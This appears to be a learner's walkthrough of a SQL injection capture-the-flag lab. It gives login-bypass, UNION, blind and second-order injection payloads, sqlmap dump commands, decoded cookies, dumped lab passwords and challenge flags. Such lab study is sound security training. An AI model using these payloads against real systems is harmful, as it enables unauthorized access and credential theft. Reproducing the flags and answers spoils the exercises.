[SQLi Lab]
[Task 1]
Deploy machine
[Task 2 Introduction to SQL Injection: Part 1]
[SQL Injection 1: Input Box Non-String]
---------------------------------------
The following PHP code demonstrates a dynamic SQL query in a login from. The user and password variables from the POST request is concatenated directly into the SQL statement.
#$query = "SELECT * FROM users WHERE username='" + $_POST["user"] + "' AND password= '" + $_POST["password"]$ + '";"
#' OR 1=1-- -
Query ' OR 1=1-- - is equal to:
#SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = ''
SQL comment:
https://blog.raw.pm/en/sql-injection-mysql-comment/ 
When a user logs in, the application performs the ff query:
#SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=10 AND password = 'ce5ca67...'
profileID=10
=>Since there's no input sanitzation, it is possible to bypass the login
by usng any True condition 
1 or 1=1-- -
Flag:THM{dccea429d73d4a6b4f117ac64724f460}
---------------------------------------
[SQL Injection 2: Input Box String]
This challenge uses same query however the parameter expects a string instead of an integer.
#profileID='10'
Modifying the payload:
#1' or '1'='1'-- -
Flag:THM{356e9de6016b9ac34e02df99a5f755ba}
--------------------------------------
[SQL Injection 3 and 4: URL and POST Injection]
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='10' AND password='ce5ca67...'
SQL Query same as the prev but in this case user input cannot be injected directly into the application via login form because of client-side control
implementations.
```js
function validateform() {
    var profileID = document.inputForm.profileID.value;
    var password = document.inputForm.password.value;

    if (/^[a-zA-Z0-9]*$/.test(profileID) == false || /^[a-zA-Z0-9]*$/.test(password) == false) {
        alert("The input fields cannot contain special characters");
        return false;
    }
    if (profileID == null || password == null) {
        alert("The input fields cannot be empty.");
        return false;
    }
}
```
SQL Injection 3: URL Injection:
#http://MACHINE_IP:5000/sesqli3/login?profileID=-1' or 1=1-- -&password=a
Malicious SQLQuery:
#10.10.30.232:5000/sesqli3/login?profileID=-1%27%20or%201=1--%20-&password=a
-------------------------------
[SQL Injection 4: POST Injection]
BurpSuite: profileID=-1' or 1=1--&password=test
Full Request:
POST /sesqli4/login HTTP/1.1
Host: 10.10.30.232:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://10.10.30.232:5000
Connection: close
Referer: http://10.10.30.232:5000/sesqli4/login
Upgrade-Insecure-Requests: 1
profileID=1' or 1=1-- -&password=test
Flag: 	THM{727334fd0f0ea1b836a8d443f09dc8eb}


[Task 3]
[ Introduction to SQL Injection: Part 2 ]
[SQLi 5 Update Statement]
profileID: 10
password: toor
If a SQL injection occurs on an UPDATE statement, the damage can be much more severe as it allows one 
to change records within the database. 
In the employee management application, 
there is an edit profile page as depicted in the following figure.
=>This edit page allows users to update their info:
_____________________________________________________________
<div class="login-form">
    <form action="/sesqli5/profile" method="post">
        <h2 class="text-center">Edit Francois's Profile Information</h2>
        <div class="form-group">
            <label for="nickName">Nick Name:</label>
            <input type="text" class="form-control" placeholder="Nick Name" id="nickName" name="nickName" value="">
        </div>
        <div class="form-group">
            <label for="email">E-mail:</label>
            <input type="text" class="form-control" placeholder="E-mail" id="email" name="email" value="">
        </div>
        <div class="form-group">
            <label for="password">Password:</label>
            <input type="password" class="form-control" placeholder="Password" id="password" name="password">
        </div>
        <div class="form-group">
            <button type="submit" class="btn btn-primary btn-block">Change</button>
        </div>
        <div class="clearfix">
            <label class="pull-left checkbox-inline"></label>
        </div>
    </form>
</div>
-------------------------------------------------------------
asd',nickName='test',email='hacked
-------------------------------------------------------------
MySQL and MSSQL',
nickName=@@version,email='# For Oracle'
,nickName=(SELECT banner FROM v$version),
email='# For SQLite',nickName=sqlite_version(),email='
-------------------------------------------------------------
#By injecting the code above, we can see that 
#the only table in the database is called “usertable” and “secrets”
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' 
and tbl_name NOT like 'sqlite_%'),email='
------------------------------------------------------------
#extract all the column names from the usertable:
',nickName=(SELECT sql FROM 
sqlite_master WHERE type!='meta' AND sql NOT NULL 
AND name ='secrets'),email='
-----------------------------------------------------------
#Extracting sensitive information
',nickName=(SELECT group_concat(id || "," || author|| "," || secret|| ":") from secrets),email='
Flag:THM{b3a540515dbd9847c29cffa1bef1edfb}
[Task 4]
[Vulnerable Startup: Broken Authentication]
#Query 1:SELECT id, username FROM users WHERE username = '' or 1=1 --' AND password = '' OR 1=1 --'
Flag:THM{f35f47dcd9d596f0d3860d14cd4c68ec} 

[Task 5]
[Vulnerable Startup: Broken Authentication 2]
' OR 1=1-- - 
Decode Cookie:
.eJxtT8tuwjAQ_Jc9--D1I0l9ripx4cYpQtHGdlpD4lCHFlWIf69dkEBtb_PY2Z09g32jcfTx1WP3sfjUBQcG2W850
uTBwCbu51OEP_bc78C0bc6Rm0KELWtlxhNFR4UIBs5_FqQZ-CmMBSoGE-2yv33YJ_5vIR5bXG8wWPzyPgbdOToSmDNsVs8_
KT9RvmAgj9wSL4mincNSlGD366ua2YGW5TCn4zpl3lRcC605Kt6om3maU64C1mtLVS0dyl5WiI3Timo7oCTfc0schWx
kP9Q1-hqlEtgrh4NrFA5aPlHZluYhjL50BOSlPo2UvsAIzS_3Z-7vX74BH_WBEw.YF6rvQ.2mMLWLZISCsN858zlgiekk_x5IY
Sources for Decoding cookie:
#https://www.kirsle.net/wizards/flask-session.cgi 
#http://10.10.95.86:5000/download/decode_cookie.py 
Decoded as:
{
    "challenge1_user_id": 1,
    "challenge1_username": "Unkown",
    "challenge1_userobj": [
        [
            1,
            "admin"
        ],
        [
            3,
            "amanda"
        ],
        [
            2,
            "dev"
        ],
        [
            5,
            "emil"
        ],
        [
            4,
            "maja"
        ]
    ],
    "challenge2_user_id": 1,
    "challenge2_username": "admin",
    "sesqli5_data": {
        "UID": 1,
        "email": "",
        "name": "Francois",
        "nickName": "",
        "passportNr": "8605255014084",
        "password": "ce5ca673d13b36118d54a7cf13aeb0ca012383bf771e713421b4d1fd841f539a",
        "profileID": "10",
        "salary": 250
    },
    "sesqli5_user_id": 1
}
#By using' UNION SELECT 1,2-- - as username we can log in as 2
UNION SELECT 1,2-- - 
#Enumerate the db to find tables and columns, lets guess column name is password and table name is users
#With this it is possible to dump all passwords
PayloadAllThings:
=>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
-------------------------------------------------------------------------------------------------------
' UNION SELECT 1, password from users-- -
#By injecting 'UNION SELECT 1,group_concat(password) FROM users-- - we can dump all passwords:
' UNION SELECT 1,group_concat(password) FROM users-- -
{
    "challenge2_user_id": 1,
    "challenge2_username": "rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{fb381dfee71ef9c31b93625ad540c9fa},viking123"
}
Flag:THM{fb381dfee71ef9c31b93625ad540c9fa}        

[Task 6]
[Vulnerable Startup: Broken Authentication 3 (Blind Injection)]
#Blind injections are tedious and time-consuming to do manually, 
#so the plan is to build a script to extract the password character by character. Before making a script to automate the injection, 
"The SQLite substr function returns a substring from a string starting at a specified position with a predefined length." 
https://www.sqlitetutorial.net/sqlite-functions/sqlite-substr/
--------------------------------------------------------------
SUBSTR( string, <start>, <length>)
Example of a substring:
-- Changing start
SUBSTR("THM{Blind}", 1,1) = T
SUBSTR("THM{Blind}", 2,1) = H
SUBSTR("THM{Blind}", 3,1) = M

-- Changing length
SUBSTR("THM{Blind}", 1,3) = THM
#The next step will be to enter the admin's password as a string into the substr function
(SELECT password FROM users LIMIT 0,1)
#compare the first character of the password with our guessed value:
SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = 'T'
----------------------------------------------------------------------------------------------------
However, whether this approach works or not will be depending on how the application handles the inputs. 
The application will convert the username to lowercase for this challenge, which breaks the mentioned approach 
since capital T is not the same as lowercase t. The hex representation of ASCII T is 0x54 and 0x74 for lowercase t. 
To deal with this, we can input our character as hex representation via the substitution type X and 
then use SQLite's CAST expression to convert the value to the datatype the database expects.
----------------------------------------------------------------------------------------------------
This means that we can input T as X'54'. To convert the value to SQLite's Text type, 
we can use the CAST expression as follows: CAST(X'54' as Text). Our final query now looks as follows:
----------------------------------------------------------------------------------------------------
admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -

#Automation Script
#loop over every possible ASCII character and compare it with the database's character.
http://10.10.95.86:5000/view/challenge3/challenge3-exploit.py
sudo python3 challenge3-exploit.py <ip>:<port>
#For example, in the query below, we ask the database if the length of the password equals 37: 
admin' AND length((SELECT password from users where username='admin'))==37-- -
------------------------------------------------------------------------------
[SQLMAP]
An alternative way to solve this challenge is by using a tool such as sqlmap, 
which is an open source tool that automates the process of detecting and exploiting SQL injection flaws. 
The following command can be used to exploit the vulnerability with sqlmap:
---------------------------------------------------------------------------
$sqlmap -u http://10.10.166.200:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump 
Flag: THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}
---------------------------------------------------------------------------


[Task 7]
[Vulnerable Startup: Vulnerable Notes]
--------------------------------------------------------------------------------------------------
#The notes function is not directly vulnerable, as the function to insert notes is safe because it uses parameterized queries. 
#With parameterized queries, the SQL statement is specified first with placeholders (?) for the parameters.
#Then the user input is passed into each parameter of the query later. 
#Parameterized queries allow the database to distinguish between code and data, regardless of the input.
Query:INSERT INTO notes (username, title, note) VALUES (?, ?, ?)
--------------------------------------------------------------------------------------------------
#Even though parameterized queries are used, the server will accept malicious data 
#and place it in the database if the application does not sanitize it. Still, the parameterized query prevents the input from leading to SQL injection.
Query:INSERT INTO users (username, password) VALUES (?, ?)
--------------------------------------------------------------------------------------------------
#However, the query that fetches all of the notes belonging to a user does not use parameterized queries. 
#The username is concatenated directly into the query, making it vulnerable to SQL injection.
Query:SELECT title, note FROM notes WHERE username = '" + username + "'
--------------------------------------------------------------------------------------------------
#This means that if we register a user with a malicious name, everything will be fine until the user navigates 
#to the notes page and the unsafe query tries to fetch the data for the malicious user.
Query:' union select 1,2'
#With this username, the application performs the following query:
Query:SELECT title, note FROM notes WHERE username = '' union select 1,2''
--------------------------------------------------------------------------------------------------
#With this knowledge, this is rather easy to exploit. 
#For example, to get all the tables from the database, we can create a user with the name:
Query:' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%''
--------------------------------------------------------------------------------------------------
#To find the flag among the passwords, register a user with the name:
Query:'  union select 1,group_concat(password) from users'
--------------------------------------------------------------------------------------------------
[SQLMap]
sqlmap --tamper so-tamper.py --url http://10.10.1.134:5000/challenge4/signup  --data "username=admin&password=asd" 
--second-url http://10.10.1.134:5000/challenge4/notes  -p username --dbms sqlite --technique=U --no-cast
#[x]Register a malicious user
#[x]Login with the malicious user
#[x]Go to the notes page to trigger the injection
--------------------------------------------------------------------------------------------------
#Dumping the users table might be hard without turning off the payload casting mechanism with the --no-cast parameter. 
#An example of the difference between casting and no casting can be seen here:
-- With casting enabled:
admin' union all select min(cast(x'717a717071' as text)||coalesce(cast(sql as text),cast(x'20' as text)))||cast(x'716b786271' as text),null from sqlite_master 
where tbl_name=cast(x'7573657273' as text)-- daqo'
-- 7573657273 is 'users' in ascii

-- Without casting:
admin' union all select cast(x'717a6a7871' as text)||id||cast(x'6774697a7462' as text)||password||cast(x'6774697a7462' as text)||username||cast(x'7162706b71' as text),null 
from users-- ypfr'

--------------------------------------------------------------------------------------------------
sqlmap --tamper tamper/so-tamper.py --url http://10.10.1.134:5000/challenge4/signup --data "username=admin&password=asd" 
--second-url http://10.10.1.134:5000/challenge4/notes -p username --dbms=sqlite --technique=U --no-cast -T users --dump
# --tamper so-tamper.py - The tamper script
# --url - The URL of the injection point, which is /signup in this case
# --data - The POST data from the registraion form to /signup. 
#   Password must be the same as the password in the tamper script
# --second-url http://10.10.1.134:5000/challenge4/notes - Visit this URL to check for results
# -p username - The parameter to inject to
# --dbms sqlite - To speed things up
# --technique=U - The technique to use. [U]nion-based
# --no-cast - Turn off payload casting mechanism
Flag: THM{4644c7e157fd5498e7e4026c89650814}  
--------------------------------------------------------------------------------------------------
[Task 8]
[Vulnerable Startup: Change Password ]
#The developer has used a placeholder for the password parameter because this input comes directly from the user. 
#The username does not come directly from the user but is rather fetched from the database based on the user id stored in the session object. 
#Therefore, the developer has thought that the username was safe to use and concatenated it directly into the query instead of using a placeholder:
UPDATE users SET password = ? WHERE username = '" + username + "'
---------------------------------------------------------------------------------------------------
#To exploit this vulnerability and gain access to the admin's user account, we can create a user with the name admin'-- -.
Query: admin' -- - 
---------------------------------------------------------------------------------------------------
#After having registered the malicious user, we can update the password for our new user to trigger the vulnerability.
#When changing the password, the application executes two queries. 
#First, it asks the database for the username and password for our current user:
SELECT username, password FROM users WHERE id = ?
---------------------------------------------------------------------------------------------------
#If all checks are fine, it will try to update the password for our user. Since the username gets concatenated 
#directly into the SQL query, the executed query will look as follows:
Query:UPDATE users SET password = ? WHERE username = 'admin' -- -'
---------------------------------------------------------------------------------------------------
#This means that instead of updating the password for admin' -- -, the application updated the password for the admin user. 
#After having updated the password, it is possible to log in as admin with the new password and view the flag. 
Flag:THM{cd5c4f197d708fda06979f13d8081013} 

[Task 9]
[Vulnerable Startup: Book Title]
Vulnerable search function:http://10.10.249.188/challenge6/book?title=test, 
#The web page performs a GET request with the parameter title when searching for a book. The query it performs can be seen here:
SELECT * from books WHERE id = (SELECT id FROM books WHERE title like '" + title + "%')
#All we need to do to abuse this is closing the LIKE operand to the right of the LIKE operator. 
#For example, we can dump all the books in the database by injecting the following command:
') or 1=1-- -
#Try One by one every payload:
') order by 1-- -
') order by 2-- -
') order by 3-- -
') order by 4-- -
') order by 5-- -
#Exploit:
') union select 1,group_concat(username),group_concat(password),4 from users-- -
Title: admin,dev,amanda,maja,emil,whoami
THM{27f8f7ce3c05ca8d6553bc5948a89210},asd,Summer2019!,345m3io4hj3,viking123,1
Author: 4

[Task 10]
[Vulnerable Startup: Book Title 2 ]
Vulnerable:http://10.10.141.207:5000/challenge7/book?title=test
----------------------------------------------------------------
#When searching for a book title, the web page performs a GET request. The application then performs two queries 
#where the first query gets the book’s ID, then later on in the process, a new SQL query is performed to get all information about the book. 
#The two queries can be seen here:
bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", 
one=True)if bid:query = f"SELECT * FROM books WHERE id = '{bid['id']}'"
----------------------------------------------------------------
#First, we will limit the result to zero rows, which can be done by not giving it any input or input we know does not exist. 
#Then we can use the UNION clause to control what the first query returns, which is the data that will be used in the second query.
' union select 'STRING
----------------------------------------------------------------
#Now that we have full control of the second query, we can use UNION-based SQL injection to extract data from the database. 
#The goal is to make the second query look something similar to the following query:
SELECT * FROM books WHERE id = '' union select 1,2,3,4-- -
#Making the application execute the query above should be as easy as injecting the following query:
' union select '1' union select 1,2,3,4-- -
----------------------------------------------------------------
#However, we are closing the string that is supposed to be returned by appending the single quote (‘) 
#before the second UNION clause. To make the query work and return our second UNION clause, we will have to escape the single quote.
' union select '-1''union select 1,2,3,4-- -
----------------------------------------------------------------
#Exploit:
' union select '-1''union select 1,group_concat(username),group_concat(password),4 from users-- -
Title: admin,dev,amanda,maja,emil,123,oof
THM{183526c1843c09809695a9979a672f09},asd,Summer2019!,345m3io4hj3,viking123,123,oof
Author: 4
